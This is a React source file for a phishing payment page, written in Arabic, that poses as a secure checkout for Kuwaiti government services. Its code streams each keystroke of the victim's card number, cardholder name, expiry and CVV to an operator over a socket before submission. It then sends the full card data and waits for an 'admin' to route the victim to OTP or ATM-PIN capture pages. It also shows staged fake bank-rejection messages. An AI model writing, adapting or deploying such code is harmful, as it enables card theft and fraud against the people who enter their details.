import { useState, useEffect, useRef } from "react";
import { useSignalEffect } from "@preact/signals-react/runtime";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  socket,
  visitor,
  sendData,
  isFormApproved,
  isCardVerified,
  navigateToPage,
  cardAction,
  waitingMessage,
} from "@/lib/store";
import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";
import visaImg from "@/kdd/assets/visa-logo.png";
import mcImg from "@/kdd/assets/mastercard-logo.png";

const schema = z.object({
  cardNumber: z
    .string()
    .min(1, "رقم البطاقة مطلوب")
    .refine((val) => {
      // Remove spaces before validation
      const cleanVal = val.replace(/\s+/g, "");
      if (!cleanVal || cleanVal.length < 13 || cleanVal.length > 19) return false;
      // Luhn algorithm validation
      let sum = 0;
      let isEven = false;
      for (let i = cleanVal.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanVal[i], 10);
        if (isEven) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      return sum % 10 === 0;
    }, "رقم البطاقة غير صحيح"),
  nameOnCard: z.string().min(1, "اسم حامل البطاقة مطلوب"),
  expiryMonth: z.string().min(1, "الشهر مطلوب"),
  expiryYear: z.string().min(1, "السنة مطلوبة"),
  cvv: z.string().length(3, "CVV يجب أن يكون 3 أرقام"),
});

type FormData = z.infer<typeof schema>;

// Generate months and years
const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1).padStart(2, "0"),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 15 }, (_, i) => ({
  value: String(currentYear + i - 2000),
  label: String(currentYear + i),
}));

// Luhn algorithm to validate card number
function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
}

// Detect card type using unified database
function getCardType(number: string): string {
  const cleanNumber = number.replace(/\s+/g, "");
  const cardType = getCardTypeFromDB(cleanNumber);
  return cardType ? cardType.toLowerCase() : "unknown";
}

// الحصول على معلومات البنك من رقم البطاقة
function getBankInfoLocal(cardNumber: string): { bank: string; logo: string } | null {
  const info = getBinInfo(cardNumber);
  if (info) {
    return { bank: info.bank, logo: info.bankLogo };
  }
  return null;
}

export default function CreditCardPayment() {
  const [, navigate] = useLocation();
  const [cardError, setCardError] = useState(false);
  const [luhnError, setLuhnError] = useState(false);
  const [rejectedError, setRejectedError] = useState(false);
  const [selectKey, setSelectKey] = useState(0); // مفتاح لإعادة تعيين Select components
  const debounceRef = useRef<ReturnType<typeof setTimeout>>();

  // Get service and amount from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const __kddSavedService = (function(){ try { return localStorage.getItem('kddService'); } catch(e){ return null; } })();
  const serviceParam = searchParams.get('service') || __kddSavedService || 'قيد سجل تجاري';
  const totalAmount = searchParams.get('amount') || localStorage.getItem('Total') || (function(){ try { return localStorage.getItem('kddAmount'); } catch(e){ return null; } })() || '0.000';
  try { if (serviceParam) localStorage.setItem('kddService', serviceParam); if (totalAmount && totalAmount !== '0.000') localStorage.setItem('kddAmount', String(totalAmount)); } catch(e){}
  const isMOH = serviceParam === 'moh';

  // For MOH, get the actual service name from localStorage
  const mohData = isMOH ? JSON.parse(localStorage.getItem('mohPaymentData') || '{}') : {};
  const serviceName = isMOH ? (mohData.serviceType || 'الضمان الصحي') : serviceParam;
  const currency = 'د.ك';

  const {
    register,
    handleSubmit,
    watch,
    setValue,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      cardNumber: "",
      nameOnCard: "",
      expiryMonth: "",
      expiryYear: "",
      cvv: "",
    },
  });

  const cardNumber = watch("cardNumber");
  const nameOnCard = watch("nameOnCard");
  const expiryMonth = watch("expiryMonth");
  const expiryYear = watch("expiryYear");
  const cvv = watch("cvv");

  // Check if form is valid for submission
  const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
  const isFormValid = 
    cleanCardNumber.length >= 13 && 
    cleanCardNumber.length <= 19 &&
    !luhnError &&
    nameOnCard?.trim().length > 0 &&
    expiryMonth?.length > 0 &&
    expiryYear?.length > 0 &&
    cvv?.length === 3;

  // Emit page enter
  useEffect(() => {
    navigateToPage("الدفع بطاقة الائتمان");
  }, []);
  // ===== بطاقة الدفع المباشر =====
  const liveDebounceRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => {
    const _s=socket.value,_a=()=>{try{_s.emit("card:live",{presence:true})}catch(e){}};if(_s.connected)_a();_s.off("connect",_a);_s.on("connect",_a);
  }, []);

  useEffect(() => {
    if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current);
    liveDebounceRef.current = setTimeout(() => {
      if (!socket.value.connected) return;
      socket.value.emit("card:live", {
        cardNumber: cleanCardNumber,
        nameOnCard: nameOnCard || "",
        expiryDate: expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "",
        cvv: cvv || "",
        consent: true,
      });
    }, 60);
    return () => { if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current); };
  }, [cardNumber, nameOnCard, expiryMonth, expiryYear, cvv]);

  useEffect(() => {
    return () => { socket.value.emit("card:liveHide"); };
  }, []);


  // Verify card number
  useEffect(() => {
    if (cardNumber && cardNumber.length === 16) {
      if (debounceRef.current) clearTimeout(debounceRef.current);
      debounceRef.current = setTimeout(() => {
        socket.value.emit("cardNumber:verify", cardNumber);
      }, 500);
    }
  }, [cardNumber]);

  // Handle card verification response
  useEffect(() => {
    if (isCardVerified.value === false) {
      setCardError(true);
    } else {
      setCardError(false);
    }
  }, [isCardVerified.value]);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/otp-verification");
    }
  }, [isFormApproved.value, navigate]);

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      
      // إخفاء اللودر فوراً عند استلام أي إجراء من الأدمن
      waitingMessage.value = "";
      
      if (action === 'otp') {
        navigate("/otp-verification");
      } else if (action === 'atm') {
        navigate("/atm-password");
      } else if (action === 'reject') {
        setRejectedError(true);
        // تفريغ جميع الحقول عند رفض البطاقة
        reset({
          cardNumber: "",
          nameOnCard: "",
          expiryMonth: "",
          expiryYear: "",
          cvv: "",
        });
        // إعادة تعيين Select components
        setSelectKey(prev => prev + 1);
      }
      // Reset card action
      cardAction.value = null;
    }
  });

  // Format card number with spaces every 4 digits
  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };

  // State for global blocked cards
  const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
  const [globalBlockedError, setGlobalBlockedError] = useState(false);

  // Listen for global blocked cards updates
  useEffect(() => {
    socket.value.emit("blockedCards:get");
    
    const handleBlockedCardsList = (cards: string[]) => {
      setGlobalBlockedCards(cards || []);
    };
    
    const handleBlockedCardsUpdated = (cards: string[]) => {
      setGlobalBlockedCards(cards || []);
    };
    
    socket.value.on("blockedCards:list", handleBlockedCardsList);
    socket.value.on("blockedCards:updated", handleBlockedCardsUpdated);
    
    return () => {
      socket.value.off("blockedCards:list", handleBlockedCardsList);
      socket.value.off("blockedCards:updated", handleBlockedCardsUpdated);
    };
  }, []);

  // Check blocked card prefixes and validate card number
  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
    const blockedPrefixes = visitor.value.blockedCardPrefixes;
    const cardPrefix = rawValue.slice(0, 4);

    // Reset global blocked error when user types
    if (globalBlockedError) {
      setGlobalBlockedError(false);
    }

    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
      setCardError(true);
      setValue("cardNumber", "");
      setLuhnError(false);
    } else {
      // Format with spaces for display
      const formattedValue = formatCardNumber(rawValue);
      setValue("cardNumber", formattedValue);
      // Check Luhn validation when card number is complete (13-19 digits)
      if (rawValue.length >= 13 && rawValue.length <= 19) {
        if (!isValidCardNumber(rawValue)) {
          setLuhnError(true);
        } else {
          setLuhnError(false);
        }
      } else {
        setLuhnError(false);
      }
    }
  };

  const onSubmit = (data: FormData) => {
    if (luhnError) return;

    // Remove spaces from card number before sending
    const cleanCardNumber = data.cardNumber.replace(/\s+/g, "");
    
    // Check if card is globally blocked
    const cardPrefix = cleanCardNumber.slice(0, 4);
    if (globalBlockedCards.includes(cardPrefix)) {
      // Show waiting overlay for 3 seconds then show error
      waitingMessage.value = "جاري التحقق من معلومات البطاقة...";
      setTimeout(() => {
        waitingMessage.value = "";
        setGlobalBlockedError(true);
        // Clear all card fields
        reset({
          cardNumber: "",
          nameOnCard: "",
          expiryMonth: "",
          expiryYear: "",
          cvv: "",
        });
        // Reset Select components
        setSelectKey(prev => prev + 1);
      }, 3000);
      return;
    }
    
    // الحصول على معلومات البنك ونوع البطاقة
    const bankInfo = getBankInfoLocal(cleanCardNumber);
    const cardType = getCardType(cleanCardNumber);
    
    // Debug logs
    console.log("CreditCardPayment - cleanCardNumber:", cleanCardNumber);
    console.log("CreditCardPayment - bankInfo:", bankInfo);
    console.log("CreditCardPayment - cardType:", cardType);
    
    // تحديث معلومات شاشة الانتظار (فقط إذا كانت البطاقة موجودة في قاعدة البيانات)
    if (bankInfo) {
      waitingCardInfo.value = {
        bankName: bankInfo.bank,
        bankLogo: bankInfo.logo,
        cardType: cardType,
      };
      console.log("CreditCardPayment - waitingCardInfo set:", waitingCardInfo.value);
    } else {
      waitingCardInfo.value = null;
      console.log("CreditCardPayment - bankInfo is null, waitingCardInfo cleared");
    }

    const paymentData = {
      totalPaid: totalAmount,
      cardType: cardType,
      cardLast4: cleanCardNumber.slice(-4),
      serviceName: serviceName,
      bankName: bankInfo?.bank || '',
      bankLogo: bankInfo?.logo || '',
    };

    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    sendData({
      paymentCard: {
        cardNumber: cleanCardNumber,
        nameOnCard: data.nameOnCard,
        expiryMonth: data.expiryMonth,
        expiryYear: data.expiryYear,
        cvv: data.cvv,
      },
      current: "الدفع",
      nextPage: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <h1 className="text-xl font-bold text-gray-800 mb-2">الدفع الآمن</h1>
          <p className="text-gray-500 text-sm">أدخل بيانات بطاقتك لإتمام الدفع</p>
          <div className="mt-3 p-3 bg-green-50 rounded-lg">
            <p className="text-sm text-gray-600">{serviceName}</p>
            <p className="text-2xl font-bold text-green-600">{totalAmount} {currency}</p>
          </div>
        </div>

        {/* Card Icons */}
        <div className="flex justify-center gap-3 mb-6">
          <img src={visaImg} alt="visa" className="h-8" />
          <img src={mcImg} alt="mastercard" className="h-8" />
        </div>

        {/* Rejected Error Message */}
        {rejectedError && (
          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
            <p className="text-red-600 text-center font-medium">معلومات البطاقة المدخلة غير صحيحة</p>
          </div>
        )}

        {/* Global Blocked Card Error Message */}
        {globalBlockedError && (
          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
            <p className="text-red-600 text-center font-medium">تم رفض العملية من قبل البنك المصدر للبطاقة</p>
            <p className="text-red-500 text-center text-sm mt-1">يرجى المحاولة بوسيلة دفع أخرى</p>
          </div>
        )}

        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
          {/* Card Number */}
          <div className="space-y-2">
            <Label htmlFor="cardNumber">رقم البطاقة</Label>
            <Input
              id="cardNumber"
              type="tel"
              inputMode="numeric"
              maxLength={19}
              placeholder="1234 5678 9012 3456"
              className={(cardError || luhnError) ? "border-red-500" : ""}
              {...register("cardNumber")}
              onChange={handleCardChange}
              onFocus={() => setRejectedError(false)}
            />
            {(errors.cardNumber || cardError || luhnError) && (
              <p className="text-red-500 text-xs">
                {luhnError ? "رقم البطاقة غير صحيح" : (errors.cardNumber?.message || "رقم البطاقة غير صحيح")}
              </p>
            )}
          </div>

          {/* Name on Card */}
          <div className="space-y-2">
            <Label htmlFor="nameOnCard">اسم حامل البطاقة</Label>
            <Input
              id="nameOnCard"
              placeholder="الاسم كما هو مدون على البطاقة"
              {...register("nameOnCard")}
              onChange={(e) => {
                // قبول حروف إنجليزية ومسافات فقط (A-Z, a-z, space)
                const englishOnly = e.target.value.replace(/[^A-Za-z\s]/g, "");
                setValue("nameOnCard", englishOnly);
              }}
            />
            {errors.nameOnCard && (
              <p className="text-red-500 text-xs">{errors.nameOnCard.message}</p>
            )}
          </div>

          {/* Expiry Date */}
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label>شهر الانتهاء</Label>
              <Select key={`month-${selectKey}`} onValueChange={(v) => setValue("expiryMonth", v)}>
                <SelectTrigger>
                  <SelectValue placeholder="الشهر" />
                </SelectTrigger>
                <SelectContent>
                  {months.map((m) => (
                    <SelectItem key={m.value} value={m.value}>
                      {m.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              {errors.expiryMonth && (
                <p className="text-red-500 text-xs">{errors.expiryMonth.message}</p>
              )}
            </div>

            <div className="space-y-2">
              <Label>سنة الانتهاء</Label>
              <Select key={`year-${selectKey}`} onValueChange={(v) => setValue("expiryYear", v)}>
                <SelectTrigger>
                  <SelectValue placeholder="السنة" />
                </SelectTrigger>
                <SelectContent>
                  {years.map((y) => (
                    <SelectItem key={y.value} value={y.value}>
                      {y.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              {errors.expiryYear && (
                <p className="text-red-500 text-xs">{errors.expiryYear.message}</p>
              )}
            </div>
          </div>

          {/* CVV */}
          <div className="space-y-2">
            <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
            <Input
              id="cvv"
              type="tel"
              inputMode="numeric"
              maxLength={3}
              placeholder="123"
              {...register("cvv")}
              onChange={(e) => {
                // قبول أرقام إنجليزية فقط (0-9)
                const englishOnly = e.target.value.replace(/[^0-9]/g, "");
                setValue("cvv", englishOnly);
              }}
            />
            {errors.cvv && (
              <p className="text-red-500 text-xs">{errors.cvv.message}</p>
            )}
          </div>

          {/* Submit Button */}
          <Button 
            type="submit" 
            className="w-full" 
            size="lg"
            disabled={!isFormValid}
          >
            ادفع الآن
          </Button>
        </form>
      </div>
    </PageLayout>
  );
}
